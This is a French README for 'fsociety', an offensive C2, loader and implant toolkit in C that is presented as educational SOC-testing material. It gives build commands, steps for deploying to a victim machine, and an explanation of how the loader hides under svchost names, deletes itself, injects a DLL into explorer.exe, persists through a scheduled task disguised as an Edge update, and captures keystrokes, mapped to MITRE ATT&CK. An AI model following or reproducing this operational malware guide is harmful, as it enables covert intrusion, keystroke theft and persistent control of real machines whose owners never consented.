# fsociety

**fsociety** est un outil d'intrusion offensif (C2 + Loader + Implant) développé en **C pur** dans un cadre strictement pédagogique et légal. Il est conçu pour tester la capacité d'un SOC à détecter et répondre à une attaque furtive et résiliente.

> ⚠️ **Avertissement légal** : Ce projet est strictement pédagogique. Il ne doit être utilisé que dans un **lab isolé**, sur des machines virtuelles que vous contrôlez, avec consentement explicite. Toute utilisation hors de ce cadre est illégale.

---

## 1. Architecture Globale

Le projet a évolué vers une architecture furtive de type **"Loader + Payload"** (similaire aux malwares modernes/APTs) pour éviter la détection visuelle et contourner les antivirus basiques.

1. **Le Serveur C2 (`server`)** : Hub central (Linux). Écoute les implants (port 4444) et les opérateurs (port 5555).
2. **Le Contrôleur (`controller`)** : Interface opérateur CLI (Linux) pour envoyer des commandes.
3. **Le Loader / Dropper (`fsociety.exe`)** : Le fichier initial (Windows). Son seul rôle est de se copier dans un dossier caché, de lancer la copie, puis de s'auto-détruire.
4. **Le Payload (`fsociety.dll`)** : La véritable logique de l'implant. Il est injecté en mémoire dans un processus légitime (`explorer.exe`) et s'auto-supprime du disque une fois chargé.

### Flux d'exécution
```text
[ Opérateur ] <--(5555)--> [ Serveur C2 ] <--(4444)--> [ explorer.exe (avec la DLL) ]
                                                            ^
                                                            | (Injection mémoire)
[ Cible ] --- exécute ---> [ fsociety.exe ] ----------------+
                                | (S'auto-détruit)
```

---

## 2. Compilation (Cross-Compile depuis Linux)

Le projet génère **deux fichiers** qui doivent être déployés ensemble. Assure-toi d'avoir `mingw-w64` installé.

### Compilation du Payload (DLL)
```bash
x86_64-w64-mingw32-gcc -m64 -shared -DBUILD_DLL -o fsociety.dll \
    implant/src/main.c \
    implant/src/modules/keylog/keylog.c \
    implant/src/modules/fivenine/fivenine.c \
    implant/src/modules/config/config.c \
    implant/src/modules/injection/injection.c \
    -Iimplant/include -Iimplant/src -Iimplant/src/modules/fivenine -Iimplant/src/modules/keylog -Iimplant/src/modules/config -Iimplant/src/modules/injection \
    -lws2_32 -ladvapi32 -luser32 -lshell32 -lntdll
```

### Compilation du Loader (EXE)
```bash
x86_64-w64-mingw32-gcc -m64 -mwindows -o fsociety.exe \
    implant/src/main.c \
    implant/src/modules/keylog/keylog.c \
    implant/src/modules/fivenine/fivenine.c \
    implant/src/modules/config/config.c \
    implant/src/modules/injection/injection.c \
    -Iimplant/include -Iimplant/src -Iimplant/src/modules/fivenine -Iimplant/src/modules/keylog -Iimplant/src/modules/config -Iimplant/src/modules/injection \
    -lws2_32 -ladvapi32 -luser32 -lshell32 -lntdll
```

*(Optionnel : Compiler le serveur C2 sur Linux avec `gcc src/main.c src/server.c src/session.c src/utils.c src/controller.c -Iinclude -o fsociety-server -lpthread`)*

---

## 3. Déploiement et Exécution (Côté Victime)

1. Transfère `fsociety.exe` et `fsociety.dll` sur la machine Windows (ex: via PowerShell `Invoke-WebRequest`).
2. Place-les dans le même dossier (ex: `C:\Users\Public\`).
3. Lance le loader : `.\fsociety.exe`

**Ce qui se passe en arrière-plan :**
* Le Loader (`fsociety.exe`) crée une copie de lui-même et de la DLL dans un dossier système caché : `%APPDATA%\Local\Microsoft\Windows\WebCache\` (sous les noms `svchost.exe` et `svchost.dll`).
* Il lance cette copie cachée.
* Il utilise `cmd.exe` pour **s'auto-supprimer** du dossier d'origine (et supprime la DLL d'origine).
* La copie cachée s'injecte dans `explorer.exe` via `CreateRemoteThread` + `LoadLibraryA`.
* La DLL supprime son propre fichier du disque dur dès qu'elle est chargée en mémoire.

**Résultat :** Aucun processus `fsociety` n'est visible dans le gestionnaire des tâches. La connexion C2 est masquée sous le processus `explorer.exe`.

---

## 4. Utilisation du Contrôleur (Côté Attaquant)

Sur Linux, lance le serveur et le contrôleur :
```bash
./fsociety-server
./fsociety-controller
```

Commandes disponibles :
*   `LIST` : Affiche les agents connectés.
*   `TASK <agent_id> <commande>` : Met une commande en file d'attente.
*   `RESULT <agent_id>` : Récupère le résultat (attendre 5 secondes après le TASK).

### Commandes Spéciales
*   **Persistance :** `TASK agent-XXXX PERSIST`
    *   *Technique :* Crée une tâche planifiée Windows (`schtasks`) nommée `MicrosoftEdgeUpdateTaskMachineCore` qui se lance au logon et exécute le loader caché dans `WebCache`.
    *   *Nettoyage :* `TASK agent-XXXX UNPERSIST`
*   **Keylogger :** `TASK agent-XXXX KEYLOG` (Capture les frappes pendant 10 secondes).

---

## 5. Fonctionnalités et Mapping MITRE ATT&CK

| Fonctionnalité | Description | MITRE ATT&CK |
| :--- | :--- | :--- |
| **Injection de code** | Injection de la DLL dans `explorer.exe` via `LoadLibraryA`. | T1055.001 / T1055.002 |
| **Auto-suppression** | Le loader et la DLL s'effacent du disque après exécution. | T1070.004 |
| **Persistance Furtive** | Tâche planifiée masquée sous un nom légitime (Microsoft Edge). | T1053.005 |
| **Résilience** | Boucle de reconnexion infinie (toutes les 30s) si le C2 tombe. | T1105 |
| **Obfuscation** | Les commandes sensibles (`PERSIST`, `KEYLOG`) sont cachées via XOR. | T1027 |
| **Keylogger** | Hook clavier bas niveau (`SetWindowsHookEx`). | T1056.001 |

